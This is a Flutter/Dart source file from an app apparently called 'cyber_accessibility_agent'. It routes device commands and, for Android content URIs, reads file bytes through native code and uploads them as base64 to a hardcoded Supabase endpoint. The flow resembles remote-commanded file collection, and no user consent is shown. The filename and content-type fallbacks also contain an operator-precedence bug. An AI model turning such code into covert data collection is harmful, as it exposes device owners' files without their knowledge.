// lib/platform/command_dispatcher.dart
import 'dart:async';
import 'dart:convert';
import 'dart:io';

import 'package:flutter/services.dart';

import '../core/command_executor.dart';
import '../core/command_parser.dart';

class CommandDispatcher {
  CommandDispatcher._();
  static final CommandDispatcher instance = CommandDispatcher._();

  /// Matches native MainActivity MethodChannel
  static const MethodChannel _channel =
      MethodChannel('cyber_accessibility_agent/commands');

  /// Use the existing singleton executor (do NOT new CommandExecutor()).
  final CommandExecutor _executor = CommandExecutor.instance;

  /// MAIN ENTRY (used internally): route content-URI uploads to native and
  /// filesystem commands to the Dart executor.
  Future<Map<String, dynamic>> dispatch(Command cmd) async {
    final path = cmd.payload['path'];
    if (path is String && path.startsWith('content://')) {
      return _handleContentUriUpload(cmd, path);
    }

    // Filesystem or other commands -> Dart-side executor
    return _executor.execute(cmd);
  }

  /// Backward-compatible API used by DeviceAgent and other callers.
  /// Adds simple retry loop with a configurable maxRetries.
  Future<Map<String, dynamic>> executeCommand(
    Command cmd, {
    Duration timeout = const Duration(seconds: 30),
    int maxRetries = 2,
  }) async {
    int attempt = 0;
    const baseDelayMs = 300;

    while (true) {
      attempt++;
      try {
        final res = await dispatch(cmd).timeout(timeout);
        // Ensure a Map<String, dynamic> response shape
        return Map<String, dynamic>.from(res);
      } catch (e, st) {
        print('[CommandDispatcher] executeCommand attempt $attempt failed: $e\n$st');
        if (attempt > maxRetries) {
          return {
            'success': false,
            'error': 'dispatcher_failed',
            'detail': e.toString(),
            'attempts': attempt,
          };
        }
        // small exponential backoff
        final delayMs = baseDelayMs * (1 << (attempt - 1));
        await Future.delayed(Duration(milliseconds: delayMs > 5000 ? 5000 : delayMs));
      }
    }
  }

  /// CONTENT URI -> ask Android native to read bytes + meta (via MethodChannel).
  ///
  /// Native 'readContentUri' should return a Map with at least:
  ///   { "success": true, "b64": "<base64>", "meta": {...}, "filename": "..." }
  /// or similar. This function is tolerant to several key names.
  Future<Map<String, dynamic>> _handleContentUriUpload(
      Command cmd, String uri) async {
    try {
      final dynamic raw = await _channel.invokeMethod<dynamic>('readContentUri', {
        'uri': uri,
      });

      if (raw == null) {
        return {
          'success': false,
          'error': 'native_read_null',
          'detail': 'readContentUri returned null',
        };
      }

      if (raw is! Map) {
        return {
          'success': false,
          'error': 'native_read_unexpected_type',
          'detail': 'expected Map from native but got ${raw.runtimeType}',
          'raw': raw.toString(),
        };
      }

      final Map<String, dynamic> result = Map<String, dynamic>.from(raw);

      if (result['success'] != true) {
        return {
          'success': false,
          'error': 'content_uri_read_failed',
          'detail': result['error'] ?? result['detail'] ?? 'native returned success!=true',
        };
      }

      // tolerant key picking
      final String? b64 = (result['b64'] ?? result['file_b64'] ?? result['fileB64'])?.toString();
      final dynamic meta = result['meta'] ?? result['metadata'];
      final String? nativeFilename = (result['filename'] ?? meta is Map ? meta['display_name'] ?? meta['name'] : null)?.toString();
      final String? contentType = (result['content_type'] ?? meta is Map ? meta['content_type'] ?? meta['mime'] : null)?.toString();

      if (b64 == null || b64.isEmpty) {
        return {
          'success': false,
          'error': 'no_bytes',
          'detail': 'native read returned no base64 payload',
        };
      }

      final payload = <String, dynamic>{
        'device_id': cmd.deviceId ?? '',
        'path': cmd.payload['dest'] ??
            result['path'] ??
            nativeFilename ??
            'content_file_${DateTime.now().millisecondsSinceEpoch}',
        'file_b64': b64,
        'content_type': contentType ?? 'application/octet-stream',
        'bucket': cmd.payload['bucket'] ?? 'device-uploads',
      };

      // attach meta if present (helpful to server)
      if (meta != null) payload['meta'] = meta;

      return await _upload(payload);
    } catch (e, st) {
      print('[CommandDispatcher] _handleContentUriUpload error: $e\n$st');
      return {
        'success': false,
        'error': 'content_uri_exception',
        'detail': '$e\n$st',
      };
    }
  }

  /// Upload to configured endpoint (Supabase edge function). Attempts to parse JSON response.
  Future<Map<String, dynamic>> _upload(Map<String, dynamic> payload) async {
    final uri = Uri.parse(
        'https://pbovhvhpewnooofaeybe.supabase.co/functions/v1/upload-files');
    final client = HttpClient();

    try {
      final req = await client.postUrl(uri);
      req.headers.set(HttpHeaders.contentTypeHeader, 'application/json');
      req.add(utf8.encode(jsonEncode(payload)));
      final resp = await req.close();
      final body = await resp.transform(utf8.decoder).join();

      if (resp.statusCode >= 200 && resp.statusCode < 300) {
        // try parse JSON, otherwise return raw text
        try {
          final parsed = jsonDecode(body);
          if (parsed is Map) {
            final m = Map<String, dynamic>.from(parsed);
            m.putIfAbsent('success', () => true);
            return m;
          } else {
            return {'success': true, 'response': parsed};
          }
        } catch (_) {
          return {'success': true, 'response_text': body};
        }
      } else {
        // non-2xx
        // try parse error JSON body
        try {
          final parsedErr = jsonDecode(body);
          return {'success': false, 'status': resp.statusCode, 'error': parsedErr};
        } catch (_) {
          return {'success': false, 'status': resp.statusCode, 'error_text': body};
        }
      }
    } catch (e, st) {
      print('[CommandDispatcher] _upload exception: $e\n$st');
      return {
        'success': false,
        'error': 'upload_exception',
        'detail': '$e\n$st',
      };
    } finally {
      client.close(force: true);
    }
  }
}